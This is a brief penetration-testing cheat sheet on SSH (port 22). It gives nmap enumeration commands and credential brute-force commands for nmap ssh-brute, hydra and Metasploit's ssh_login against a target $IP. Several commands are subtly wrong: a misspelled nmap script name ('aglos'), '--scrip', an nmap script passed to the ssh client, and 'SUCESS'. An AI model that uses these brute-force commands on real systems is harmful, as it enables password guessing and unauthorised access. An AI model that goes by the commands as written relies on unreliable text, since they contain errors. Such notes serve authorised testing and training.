---
description: Secure Shell protocol (port 22)
---

# SSH



## nmap

* to scan all the algo that are supported by the SSH server

```bash
nmap -p22 $IP --script ssh2-enum-aglos 
```

* to get host key

```bash
nmap -p22 $IP --script ssh-hostkey --script-args ssh_hostkey=full
#again.... -sC does this for us.
```

* to check what auth methods is there for a user

```bash
ssh -p22 $IP --script ssh-auth-methods --script-args="ssh.user=username"
```

* bruteforce a user

```bash
nmap $IP -p22 --scrip ssh-brute --script-args userdb=/path/to/username(s).txt
```

## hydra

* bruteforce a user

```bash
hydra -l $username -P /path/to/wordlist $IP ssh
```

## msfconsole

* bruteforce a user

```bash
use auxiliary/scanner/ssh/ssh_login

#options
set RHOSTS $IP
set userpass_file /path/to/wordlist
set STOP_ON_SUCESS true
```
